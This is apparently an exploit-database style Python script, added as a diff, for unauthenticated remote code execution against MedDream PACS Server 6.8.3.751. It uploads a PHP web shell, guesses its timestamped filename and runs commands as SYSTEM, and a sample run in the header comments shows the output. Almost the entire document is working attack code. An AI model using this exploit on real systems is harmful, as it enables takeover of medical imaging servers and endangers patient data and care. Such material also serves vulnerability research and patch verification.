@@ -1,0 +1,103 @@
+#!/usr/bin/python
+#
+# Exploit Title: MedDream PACS Server 6.8.3.751 - Remote Code Execution (Unauthenticated)
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Date: 10-10-2020
+# Vulnerable Software: https://www.softneta.com/products/meddream-pacs-server/
+# Vendor Homepage: https://www.softneta.com
+# Version: 6.8.3.751
+# Tested On: Windows 2016
+#
+#
+# Update to EB 48853 < AUTHENTICATION WAS NOT NEEDED LOLZ
+#
+##PoC##
+#
+# 1. create one line php shell to call commands
+# 2. run script on attacking machine
+# 3. enter parameters; IP, filename, command
+# 
+#
+# root@kali:~# python meddream.py 
+# Enter IP Address: 192.168.0.223
+# Enter payload filename + .php: cmd.php
+# Enter command: whoami
+# 170759
+# <pre>nt authority\system
+# </pre>
+# http://192.168.0.223/Pacs/upload/20201010-170759--cmd.php?cmd=whoami
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+#
+#
+
+from urllib2 import urlopen                        
+import requests
+import sys
+import time
+from datetime import datetime, timedelta
+
+ip_addr = raw_input("Enter IP Address: ")
+user_file = raw_input("Enter payload filename + .php: ")
+cmd = raw_input("Enter command: ")
+
+URL= 'http://' + ip_addr + '/Pacs/uploadImage.php'
+
+def main():
+    session = requests.Session() 
+
+    files = [
+    ('actionvalue', (None, 'Attach', None)),
+    ('uploadfile', (user_file, open(user_file, 'rb'), 'application/x-php')),
+    ('action', (None, 'Attach', None)),
+    ]
+    
+    site = session.post(URL, files=files)
+
+    today = datetime.today()
+    upload_date = today.strftime("%Y%m%d")
+
+    less = 1
+    now1 = datetime.now()
+    up_time1 = now1.strftime("%H%M%S")
+    print(up_time1)
+    #varying time checks +/-
+    now2 = now1 - timedelta(seconds=less)
+    up_time2 = now2.strftime("%H%M%S")
+    now3 = now2 - timedelta(seconds=less)
+    up_time3 = now3.strftime("%H%M%S")
+    now4 = now3 - timedelta(seconds=less)
+    up_time4 = now4.strftime("%H%M%S")
+    now5 = now4 - timedelta(seconds=less)
+    up_time5 = now5.strftime("%H%M%S")
+    now6 = now5 - timedelta(seconds=less)
+    up_time6 = now6.strftime("%H%M%S")
+    now7 = now6 - timedelta(seconds=less)
+    up_time7 = now7.strftime("%H%M%S")
+    now8 = now1 + timedelta(seconds=less)
+    up_time8 = now8.strftime("%H%M%S")
+    now9 = now8 + timedelta(seconds=less)
+    up_time9 = now8.strftime("%H%M%S")
+    now10 = now1 + timedelta(seconds=less)
+    up_time10 = now9.strftime("%H%M%S")
+
+
+    up_time_array = [up_time1, up_time2, up_time3, up_time4, up_time5, up_time6, up_time7, up_time8, up_time9, up_time10]  
+    for i in up_time_array: 
+        r = session.get('http://' + ip_addr + '/Pacs/upload/'+ upload_date + "-" + i + "--" + user_file + "?cmd=" + cmd)
+        if r.status_code == 200: 
+            print r.content
+            print r.url
+        else:
+            print ("404")
+
+if __name__ == '__main__':
+    main()
